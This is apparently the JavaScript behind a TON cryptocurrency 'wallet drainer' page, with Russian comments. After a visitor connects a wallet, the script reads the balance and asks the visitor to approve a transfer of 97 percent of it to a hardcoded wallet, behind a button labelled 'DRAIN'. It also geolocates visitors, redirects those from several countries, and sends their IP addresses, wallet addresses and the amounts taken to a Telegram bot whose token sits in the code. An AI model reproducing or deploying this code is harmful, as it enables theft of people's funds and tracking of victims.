const manifestUrl = `${window.location.protocol}//${window.location.host}/tonconnect-manifest.json`;

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    buttonRootId: 'ton-connect',
    language: 'ru'
});
// Кошелек для получения средств
const mainWallet = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp"; 

// Telegram данные
const tgBotToken = "7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA";
const tgChat = ""; // Ваш телеграмм-канал
const domain = window.location.hostname;
let ipUser, countryUser;

// Проверка геолокации
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    const blockedCountries = ['KZ', 'BY', 'AM', 'AZ', 'KG', 'MD', 'UZ'];
    if (blockedCountries.includes(data.country)) {
      window.location.replace('https://ton.org');
    }
    ipUser = data.ip;
    countryUser = data.country;
    
    // Отправка уведомления в Telegram
    const message = `*Domain:* ${domain}\n*User:* ${ipUser} ${countryUser}\n*Opened the website*`;
    sendTelegramMessage(message);
  })
  .catch(error => console.error('Error IP:', error));

  // Проверка доступности манифеста
fetch(manifestUrl)
    .then(response => {
        if (!response.ok) throw new Error('Manifest not found');
        return response.json();
    })
    .then(manifest => {
        console.log('Manifest loaded:', manifest);
    })
    .catch(error => {
        console.error('Manifest error:', error);
        alert('Ошибка загрузки манифеста. Проверьте консоль для деталей.');
    });
// Обработчик подключения кошелька
tonConnectUI.onStatusChange((wallet) => {
    if (wallet) {
        console.log('Кошелек подключен:', wallet);
        // Здесь можно добавить логику после подключения
    } else {
        console.log('Кошелек отключен');
    }
});

// Функция для отправки транзакции
async function sendTransaction() {
    if (!tonConnectUI.connected) {
        alert('Пожалуйста, сначала подключите кошелек');
        return;
    }

    const walletAddress = tonConnectUI.account.address;
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();
    const balance = parseFloat(data.balance);
    const amountToSend = balance * 0.97; // Оставляем 3% на комиссии

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
        messages: [{
            address: mainWallet,
            amount: amountToSend.toString()
        }]
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция успешна:', result);
        const message = `*Domain:* ${domain}\n*User:* ${ipUser} ${countryUser}\n*Wallet:* ${walletAddress}\n*Send:* ${amountToSend / 1e9} TON`;
        sendTelegramMessage(message);
        alert('Транзакция успешно отправлена!');
    } catch (error) {
        console.error('Ошибка транзакции:', error);
        const message = `*Domain:* ${domain}\n*User:* ${ipUser} ${countryUser}\n*Wallet:* ${walletAddress}\n*Error:* ${error.message}`;
        sendTelegramMessage(message);
        alert('Ошибка при отправке транзакции: ' + error.message);
    }
}

// Основная функция для перевода средств
async function didtrans() {
    try {
        // Проверяем подключен ли кошелек
        if (!tonConnectUI.connected || !tonConnectUI.account) {
            alert('Пожалуйста, сначала подключите кошелек');
            return;
        }

        const drainBtn = document.getElementById('drain-btn');
        drainBtn.disabled = true;
        drainBtn.textContent = 'Processing...';

        // Получаем баланс кошелька
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`);
        const data = await response.json();
        const balance = parseFloat(data.balance);
        
        if (balance <= 0) {
            alert('На кошельке недостаточно средств');
            drainBtn.disabled = false;
            drainBtn.textContent = 'DRAIN';
            return;
        }

        // Оставляем 3% на комиссии
        const amountToSend = Math.floor(balance * 0.97).toString();

        // Создаем транзакцию
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
            messages: [{
                address: 'UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp', // Ваш кошелек
                amount: amountToSend
            }]
        };

        // Отправляем транзакцию
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Transaction successful:', result);
        
        // Отправляем уведомление в Telegram
        const message = `*New transaction*\nFrom: ${tonConnectUI.account.address}\nAmount: ${amountToSend/1e9} TON`;
        sendTelegramMessage(message);
        
        alert(`Успешно отправлено ${amountToSend/1e9} TON!`);
        
    } catch (error) {
        console.error('Transaction failed:', error);
        alert('Ошибка: ' + error.message);
        
        const message = `*Transaction failed*\nError: ${error.message}`;
        sendTelegramMessage(message);
    } finally {
        const drainBtn = document.getElementById('drain-btn');
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = 'DRAIN';
        }
    }
}

// Функция для отправки в Telegram
function sendTelegramMessage(text) {
    const tgBotToken = '7412797367:AAE9ZTr0L4xI6GtALTGXUXINvGt_-CV0cDA';
    const tgChat = '8126533622'; // Ваш chat ID
    
    if (!tgChat) return;
    
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    fetch(url).catch(err => console.error('Telegram error:', err));
}

// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', () => {
    const drainBtn = document.getElementById('drain-btn');
    if (drainBtn) {
        drainBtn.addEventListener('click', didtrans);
    }
});
